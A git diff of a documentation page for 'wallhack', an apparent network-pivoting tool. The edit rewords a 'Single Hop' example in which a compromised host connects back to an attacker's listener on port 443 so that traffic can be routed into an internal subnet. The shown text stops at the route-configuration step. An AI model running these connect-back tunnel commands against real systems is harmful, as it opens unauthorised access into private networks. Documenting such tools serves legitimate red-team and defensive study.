@@ -1,24 +1,24 @@
 ---
-title: Single Hop
+title: Single Hop Example
 description: Establish a direct tunnel between an entry node and a single compromised host.
 order: 7
 ---
 
-# Single Hop
+# Single Hop Example
 
-The most common deployment. A compromised host (`10.0.1.5`) connects back to your machine (`10.0.0.5`). Routes to the internal network are added through the tunnel.
+The most common deployment. A compromised host (`10.0.1.5`) connects back to your machine (`10.0.0.5`). Once the tunnel is up, you route traffic to the networks the compromised host can reach — in this example, `192.168.1.0/24`.
 
 {% steps %}
-{% step title="Attacker (Entry)" number=1 %}
-Listen for incoming connections.
+{% step title="Attacker" number=1 %}
+An [entry node](/concepts) listening for incoming connections.
 
 {% codeblock code="wallhack entry --listen :443" /%}
 {% /step %}
 
-{% step title="Compromised Host (Exit)" number=2 %}
-Connect back to the attacker.
+{% step title="Compromised Host" number=2 %}
+An [exit node](/concepts) connecting back to the attacker.
 
-{% codeblock code="./wallhack exit --connect 10.0.0.5:443" /%}
+{% codeblock code="wallhack exit --connect 10.0.0.5:443" /%}
 {% /step %}
 
 {% step title="Configure Routes" number=3 %}
